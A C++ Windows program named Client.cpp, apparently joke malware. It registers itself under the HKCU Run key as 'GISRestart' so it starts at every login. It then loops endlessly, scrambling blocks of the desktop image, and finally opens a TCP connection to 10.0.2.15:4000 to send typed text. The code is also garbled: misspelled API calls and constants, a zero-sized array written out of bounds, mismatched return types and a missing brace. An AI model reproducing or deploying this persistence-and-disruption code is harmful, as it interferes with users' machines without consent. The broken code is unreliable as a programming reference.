/*************************************************************************
	> File Name: Client.cpp
	> Created Time: Sat 09 Jan 2021 06:19:19 PM CST
 ************************************************************************/

#include <stdio.h>
#include <Windows.h>
#include <string> 
#include <conio.h>

#define NUM 1024
#pragma comment(lib,"ws2_32.lib")
#define  PORT 4000
#define  IP_ADDRESS "10.0.2.15"
 
void autostart()
{
	//设置开机自启
	HKEY hkey;
	string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	if(RegOpenKeyEx(HKEY_CURRENT_USER,strRegPath.c_str(),0,KEY_ALLACCESS,&hkey) == ERROR_SUCCESS)
	{
			TCHAR strExeFullDir[MAX_PATH];
			GetModuleFileName(NULL,strExeFullDir,MAX_PATH);

			TCHAR strDir[MAX_PATH] = {};
			DWORD nLength = MAX_PATH;
			long result = RegGetValue(hkey,nullptr,"GISRestart",RRF_RT_REG_SZ,0,strDir,&nLength);

			if(result != ERROR_SUCCESS || _tcscmp(strExeFullDir,strDir) != 0)
			{
					RegSetVakyeEx(hkey,"GISRestart",0,REG_SZ,(LPBYTE)strExeFullDir,(lstrlen(strExeFullDir)+1)*sizeof(TCHAR)) ;

					RegCloseKey(hkey);

			}
	}
	else
	{
			printf("ERROR");
	}


}


void canceAutoStart()
{
		//取消开机自启
		HKEY hkey;
		string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		
		if(RegOpenKeyEx(HKEY_CURRENT_USER,strRegPath.c_str(),0,KEY_ALL_ACCESS,&hkey) == ERROR_SUCCESS)
		{
				RegDeleteValue(hkey,"GISRestart");
				RegCloseKey(hkey);

		}
}


void Communication()
{
	WSADATA  Ws;
    SOCKET ClientSocket;
    struct sockaddr_in ClientAddr;
    int Ret = 0;
    char SendBuffer[MAX_PATH];
 
    /* Init Windows Socket */
    if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
    {
        printf("Init Windows Socket Failed::%d\n", GetLastError());
        return -1;
    }
 
    /* Create Socket */
    ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if ( ClientSocket == INVALID_SOCKET )
    {
        printf("Create Socket Failed::%d\n", GetLastError());
        return -1;
    }
 
    ClientAddr.sin_family = AF_INET;
    ClientAddr.sin_addr.s_addr = inet_addr(IP_ADDRESS);
    ClientAddr.sin_port = htons(PORT);
    memset(ClientAddr.sin_zero, 0x00, 8);
 
	/* connect socket */
    Ret = connect(ClientSocket,(struct sockaddr*)&ClientAddr, sizeof(ClientAddr));
    if ( Ret == SOCKET_ERROR )
    {
        printf("Connect Error::%d\n", GetLastError());
        return -1;
    }
    else
    {
        printf("Connect succedded!\n");
    }
 
    while (1)
    {
        scanf("%s", SendBuffer);
 
		/* send data to server */
        Ret = send(ClientSocket, SendBuffer, (int)strlen(SendBuffer), 0);
        if ( Ret == SOCKET_ERROR )
        {
            printf("Send Info Error::%d\n", GetLastError());
            break;
        }
		
		if('q' == SendBuffer[0])
		{
			break;
		}
    }
    
	/* close socket */
    closesocket(ClientSocket);
    WSACleanup();
 
    return 0;
}


void Mosaic_Desktop()
{
	HWND hwnd = GetDesktopWindow();
	int rects[NULL][4];
	while(true)
	{

		
		if(LockWindowUpdate(hwnd) == false)
		{
				return 1;
		}

		//获得桌面窗口的设备上下文
		HDC hdcSrc = GetDCEx(hwnd,NULL,
						DCX_CACHEa |  //高速缓存)
						DCX_LOCKWINDOWUPDATE);
		
		//创建一个内存设备上下文
		HDC hdcMem = CreateCompatibleDC(hdcSrc); 

		//切割小块的宽度
		
		int cx = GetSystemMetrics(SM_CXSCREEN) / 10;
		int cy = GetSystemMetrics(SM_CYSCREEN) / 10;

		//创建位图
		HBITMAP hBitmap = CreateCompatibleBitmap(hdcSrc,cx,cy);

		//位图和内存设备的关联
		SelectorObject(hdcMen,HBitmap);

		//切割区域
		//随机数
		
		
		for(int i = 0;i < NUM;i++)
		{
			rects[i][0] = cx * (rand() % 10);
			rects[i][1] = cy * (rand() % 10);
			rects[i][2] = cx * (rand() % 10);
			rects[i][3] = cy * (rand() % 10);
			
		}

		//切割
		for(int i = 0;i < NUM;i++)
		{
				BitBlt(
								hdcMem,
								0,0,
								cx,cy,
								hdcSrc,
								rects[i][0],
								rects[i][1],
								SPCCOPY //拷贝方式
					  );

				BitBlt(hdcSrc,rects[i][2],rects[i][3],cx,cy,hdcMem,0,0,SRCCOPY);
				Sleep(1);
				
				//打扫门户
				DeleteDC(hdcMem);
				ReleaseDC(hwnd,hdcSrc);
				DeleteObject(hBitmap);


		}
		
		
}



int main(int argc, char* argv[])
{
	autostart();	
	Mosaic_Desktop();
	Communication();

}





